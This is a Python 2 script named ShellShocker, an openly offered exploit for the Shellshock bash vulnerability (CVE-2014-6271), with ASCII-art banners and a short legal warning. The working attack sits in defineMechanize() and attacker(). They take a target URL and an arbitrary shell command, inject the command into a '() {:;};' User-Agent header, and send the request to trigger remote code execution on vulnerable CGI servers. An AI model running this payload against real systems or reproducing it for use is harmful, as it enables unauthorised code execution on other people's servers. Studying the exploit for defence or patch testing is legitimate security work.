#! /usr/bin/python
#qpy:console

####################################         /&/
# ShellShocker  ::     ##########            ! &
# Shellshock bug       ###############     #/!!/
# exploit              ########                   # 
#  ...HackYoUrMind...  ############           #/
# CVE-2014-6271 (Main) ########
#################################                  #

# Stefano Belli <stefano9913@gmail.com> ][ Google+ : <http://plus.google.com/+StefanoBelli>
# Last updated: [DD/MM/YYYY] 09/12/2014, [HH/MM] 14:44 PM
# Status: initial release
# support: posix (Unix) / Windows may require Cygwin[BATCH NOT SUPPORTED] due to unsupported things. Program runs.
# Be free! Open Source <(C)
# Version: 1.0
# Status: WORKING

#Modules
import os
import sys

# Sys.Argv -- argument parser
len(sys.argv)

#variables!
_licence_ = '''
ShellShocker <(C) | WARNING
========================================
Be free, but remember that this is a pentest tool
should be used for TEST your systems, i assume no
responsibility ! :D
Exploiting remote machines, WITHOUT administrator/owner
knownledge, is ILLEGAL.
Think before attack your target!

i ADVIDSED you.

:::.::.:::.::.:..::.::::.....:::..:::.
========================================
'''
version = 1
status = "Working"

__main__ = '''
ShellShocker <(C) | Exploit (Shell)

 #####                               #####                              
#     # #    # ###### #      #      #     # #    #  ####   ####  #    # (er)
#       #    # #      #      #      #       #    # #    # #    # #   #  
 #####  ###### #####  #      #       #####  ###### #    # #      ####   
      # #    # #      #      #            # #    # #    # #      #  #   
#     # #    # #      #      #      #     # #    # #    # #    # #   #  
 #####  #    # ###### ###### #####term#  #####  #    #  ####   ####  #    # 
                                            Shell-Shock(er)                          

      /* Bash Shocked */
      Vulnerability: CVE-2014-6271
      Warning: 10/10 [!!]
      Exploit type: \033[31mArbitrary code execution\033[0m
      Vulnerable: CGI-BIN is vulnerable ( if bash shell handles request), DHCP Server and more.
      Fixed: Yes

      Python 2.7
      =>Requires
        -mechanize
        -os
        -sys

      Developer: Stefano belli (--developer for more info(s) )
      Script version: %s
      GitHub: <http://github.com/StefanoBelli/shellshocker-python>Term
      Last updated: 09/12/2014 [DD/MM/YYYY] @ 14:44 PM

Usage: shellshock_exec_beta-devel.py <option>

options: --risks
         --developer
      

''' %version



_developer_ = '''
ShellShocker <(C) | Developer
=========================================
Stefano Belli,
EMail: <stefano9913@gmail.com>
Google+: <plus.google.com/+StefanoBelli>
Twitter: <@S73FYH4CK>
GitHub: <http://github.com/StefanoBelli>
++++++++++++++++++++++++++++++++++++++++++
'''

exitValue = 0
currentDir = os.getcwd()
__welcome__ = '''
ShellShocker <(C) | Restart
<=======================>
Welcome to ShellShocker
restart by: %s
<=======================>'''%currentDir

_retry_ = '''
========================
'''



#Argument 
for arg in sys.argv:
    if arg == "--licence":
        os.system("clear")
        print ""
        print(_licence_)
        print ""
        exit(0)
    elif arg == "--risks":
        os.system("clear")
        print ""
        print(_developer_)
        print ""
        exit(0)
        

################################ GO!
try:
    #Check if mechanize is installed, if not let the user choose if he/she(dreams :D ) wants to get it
    import mechanize
except ImportError:
    os.system("clear")
    print("{!} Import error: mechanize libs are not installed!")
    #Package manager chooser, install mechanize automatically if not availible (ImportError Exception)
    outOrGet = raw_input("{?} Do you want to exit or get mechanize[e/M]: ")
    if outOrGet == 'e':
        exit(1)
        exitValue = 1
    elif outOrGet == 'm':
        packageManager = raw_input("{?} What package manager are you using?[apt/yum]: ")
        if packageManager == 'apt':
            try:
                os.system("apt-get install python-mechanize")
                os.system("clear")
                print(__welcome__)
            except KeyboardInterrupt:
                os.system("clear")
                print("{!} Quitted by Keyboard Shortcut\n\n")
                exit(0)
            
        elif packageManager == 'yum':
            try:
                os.system("yum install python-mechanize")
                os.system("clear")
                print(__welcome__)
                exit(0) 
            except KeyboardInterrupt:
                os.system("clear")
                print("{!} Quitted by Keyboard Shortcut\n\n")
                exit(0)
            
        else:
            print("{!} Other package managers are not supported! (Wait until support comes...) ")
            exitValue = 1
            exit(1)

    #Check for Android 
    try:
        import androidhelper
    except ImportError:
        print("[!} Supporting Android by QPython ~ TextualShell\n")
        pass
    else:
        print("{!} Mechanize don't supported. Application is begin builded (Java)")
        exit(1)
#Define mechanize values
def defineMechanize():
    global br
    try:
        br = mechanize.Browser()
    except NameError:
        if exitValue == 0:
            pass
        elif exitValue == 1:
            print("{\033[32minfo\033[0m} Bye!")
            exit(1)
    br.addheaders = [('User-agent', '() {:;}; %s'%getCommand)]
    
#Main screen 
def mainChooser():
    global getTarget
    global getCommand
    try:
        os.system("clear")
        print(__main__)
        getTarget = raw_input("{?/!}sskr:type-Target# ")
        print("{!!} Target: %s"%getTarget)
        print("")
        getCommand = raw_input("{?/!!}sskr:type-Command# ")
        print("{!!} Command: %s"%getCommand)
    except KeyboardInterrupt:
        print("{!} User quitted (while get data) ")
        exit(0)
    except SyntaxError:
        print("{!} Dev error! submit this error: mainChooser() SyntaxError [[ See my email address for more info (call --developer)")
        exit(0)

#Attack
def attacker():
    try:
        print ""
        print("{!!} \033[31mAll data acquired... Calling %s\033[0m"%getTarget)
        br.open(getTarget)
        response = br.response()
        if response:
            print("{+} Command: "%getCommand+" executed."%getTarget+" Was reachable")
            exit(0)
        else:
            print("{!} Error(s) happened, but maybe command was executed by bash shell")
            print(" I cannot reach ERROR/EXCEPTION.")
            exit(0)
            
    except KeyboardInterrupt:
        print("{!} User quitted ( attacker() )")
        exit(0)
    except mechanize._mechanize.BrowserStateError:
        print("{!} I cannot reach website.")
        retryOrNot = raw_input("{?} Would you like to get back for retry?[Y/n]: ")
        if retryOrNot == 'y':
            os.system("clear")
            print (_retry_)
            mainChooser()
            defineMechanize()
            attacker()
        else:
            print("Bye bye!\nAnd remember... \033[31mW00t W00t i got r00t!\033[0m")
            exit(0)
            
####EXECUTE####
mainChooser()     
defineMechanize()  
attacker()         
###############